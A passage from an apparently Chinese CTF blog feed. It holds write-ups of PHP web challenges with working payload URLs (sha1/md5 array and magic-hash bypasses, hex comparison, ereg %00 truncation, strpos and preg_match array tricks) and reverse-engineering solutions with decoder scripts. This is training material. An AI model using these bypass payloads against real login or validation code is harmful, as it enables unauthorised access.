class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))&#123;var_dump($_GET[<span class="hljs-string">'name'</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;var_dump($_GET[<span class="hljs-string">'password'</span>]);var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>payload<code>http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=0</code></li></ul><p>利用sha1函数不能处理数组进行构造payload<br>代码审计需要满足三个条件：</p><ol><li>if (isset(GET[′name′])andisset(_GET[‘password’])) ==》TRUE<ol start="2"><li>if (GET[′name′]==_GET[‘password’]) ==》FALSE</li></ol></li><li>if sha1(GET[′name′])===sha1(_GET[‘password’])) ==》TRUE</li></ol><h3 id="md5加密相等绕过">md5加密相等绕过<a class="post-anchor" href="#md5加密相等绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/13.php?a=s878926199a</code>弱类型比较</p><h3 id="十六进制与数字比较">十六进制与数字比较<a class="post-anchor" href="#十六进制与数字比较"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>&#123;$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$number = <span class="hljs-string">'3735929054'</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)&#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp&#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre><p>定义了一个function <code>noother_says_correct</code><br>首先分析代码，函数要求变量$temp不能存在1-9之间的数字，<br>最后，又要求$temp=3735929054;<br>这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把<br>3735929054转换成16进制为0xdeadc0de，记得带上0x；<br>构造payload<br><code>password=0xdeadc0de</code></p><h3 id="变量覆盖">变量覆盖<a class="post-anchor" href="#变量覆盖"></a></h3><p>服务器被覆盖了..</p><h3 id="0x11-ereg正则-00截断">0x11 - ereg正则%00截断<a class="post-anchor" href="#0x11-ereg正则-00截断"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"xxx"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))&#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)&#123;<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'*-*'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ol><li>if (ereg (“^[a-zA-Z0-9]+”,_GET[‘password’]) === FALSE)  ==》 FLASE</li><li>if (strlen(_GET[‘password’]) &lt; 8 &amp;&amp;_GET[‘password’] &gt; 9999999)    //正常感觉矛盾，但是可以利用科学计数法绕过1e8 &gt; 9999999</li><li>if (strpos ($_GET[‘password’], ‘<em>-</em>‘) !== FALSE)   //password的值应包含字符串’<em>-</em>‘<br>构造payload：<blockquote><p><code>http://123.206.87.240:9009/5.php?password=1e8%00*-*http://123.206.87.240:9009/5.php?password[]=</code></p></blockquote></li></ol><h3 id="strpos数组绕过">strpos数组绕过<a class="post-anchor" href="#strpos数组绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/15.php?ctf[]=</code></p><h3 id="数字验证正则绕过">数字验证正则绕过<a class="post-anchor" href="#数字验证正则绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])&#123;$password = $_POST[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)&#123;$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span><span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>利用preg_match()函数不能处理数组进行构造payload<br>payload<code>post : password[]=</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019掘安杯-write up</title>
      <link href="/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/"/>
      <url>/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="baby-reverse">baby_reverse<a class="post-anchor" href="#baby-reverse"></a></h2><p>加密函数如下</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)</span></span>&#123;  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-30h]</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+74h] [rbp-Ch]</span>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+7Ch] [rbp-4h]</span>  v7 = <span class="hljs-number">18</span>;  i = <span class="hljs-number">0</span>;  v6 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) != <span class="hljs-number">18</span> )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Your Length is Wrong"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"flag&#123;This_1s_f4cker_flag&#125;"</span>);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v7; i += <span class="hljs-number">3</span> )  &#123;    v5[i] = v7 ^ (a1[i] + <span class="hljs-number">6</span>);    v4[i + <span class="hljs-number">1</span>] = (a1[i + <span class="hljs-number">1</span>] - <span class="hljs-number">6</span>) ^ v7;    v3[i + <span class="hljs-number">2</span>] = a1[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">6</span> ^ v7;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + <span class="hljs-number">1L</span>L) = v4[i + <span class="hljs-number">1</span>];    *(_BYTE *)(a2 + i + <span class="hljs-number">2L</span>L) = v3[i + <span class="hljs-number">2</span>];  &#125;  <span class="hljs-keyword">return</span> a2;&#125;</code></pre><p>很简单得加密函数<br>一共分为三组</p><pre><code class="hljs python">key = <span class="hljs-string">'bIwhroo8cwqgwrxusi'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">3</span>):  flag += chr((ord(key[i])^<span class="hljs-number">18</span>) - <span class="hljs-number">6</span>) + chr((ord(key[i+<span class="hljs-number">1</span>])^<span class="hljs-number">18</span>) + <span class="hljs-number">6</span>) + chr(ord(key[i+<span class="hljs-number">2</span>])^<span class="hljs-number">6</span>^<span class="hljs-number">18</span>)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#jactf&#123;w0w_is_flag&#125;</span></code></pre><h2 id="Replace">Replace<a class="post-anchor" href="#Replace"></a></h2><p>加密函数如下</p><pre><code class="hljs cpp">v2 = a1;  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">35</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    v5 = *(_BYTE *)(v4 + v2);    v6 = (v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v7 = (<span class="hljs-number">16</span> * v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v8 = byte_402150[<span class="hljs-number">2</span> * v4];    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">48</span> || v8 &gt; <span class="hljs-number">57</span> )      v9 = v8 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v9 = v8 - <span class="hljs-number">48</span>;    v10 = byte_402151[<span class="hljs-number">2</span> * v4];    v11 = <span class="hljs-number">16</span> * v9;    <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-number">48</span> || v10 &gt; <span class="hljs-number">57</span> )      v12 = v10 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v12 = v10 - <span class="hljs-number">48</span>;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)byte_4021A0[<span class="hljs-number">16</span> * v6 + v7] != ((v11 + v12) ^ <span class="hljs-number">0x19</span>) )      <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">if</span> ( ++v4 &gt;= <span class="hljs-number">35</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</code></pre><p>这是爆破的思路</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> stringbyte_402150 = [<span class="hljs-number">0x32</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>,<span class="hljs-number">0x31</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>]byte_4021A0 = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>,  <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>,  <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,  <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>,  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]flag=<span class="hljs-string">''</span>v4=<span class="hljs-number">0</span>dic=string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="hljs-string">'&#123;&#125;_!%^&amp;'</span><span class="hljs-keyword">while</span>(v4&lt;<span class="hljs-number">35</span>):  v8 = byte_402150[<span class="hljs-number">2</span>*v4]  <span class="hljs-keyword">if</span> (v8 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v8 &gt; <span class="hljs-number">57</span>):    v9 = v8 - <span class="hljs-number">87</span>  <span class="hljs-keyword">else</span>:    v9 = v8 <span class="hljs-number">-48</span>  v10 = byte_402150[<span class="hljs-number">2</span>*v4+<span class="hljs-number">1</span>]  v11 = <span class="hljs-number">16</span> * v9  <span class="hljs-keyword">if</span>(v10 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v10 &gt;<span class="hljs-number">57</span>):    v12 = v10 <span class="hljs-number">-87</span>  <span class="hljs-keyword">else</span>:    v12 = v10 <span class="hljs-number">-48</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:    v6 = (ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    v7 = (<span class="hljs-number">16</span>*ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    <span class="hljs-keyword">if</span>(byte_4021A0[<span class="hljs-number">16</span>*v6 + v7]==(v11+v12)^<span class="hljs-number">0x19</span>):      flag += i      <span class="hljs-keyword">break</span>  v4 += <span class="hljs-number">1</span><span class="hljs-keyword">print</span> flag<span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span></code></pre><p>贴一下<a href="https://seanachao.github.io/2018/11/29/%E6%B9%96%E6%B9%98%E6%9D%AFre%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">大佬</a>用z3解的脚本</p><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8 -*-</span><span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span>list_flag = [<span class="hljs-number">51</span>, <span class="hljs-number">80</span>, <span class="hljs-number">239</span>, <span class="hljs-number">133</span>, <span class="hljs-number">33</span>, <span class="hljs-number">32</span>, <span class="hljs-number">69</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">237</span>, <span class="hljs-number">249</span>, <span class="hljs-number">60</span>, <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">77</span>, <span class="hljs-number">207</span>, <span class="hljs-number">0</span>, <span class="hljs-number">77</span>, <span class="hljs-number">81</span>, <span class="hljs-number">199</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>, <span 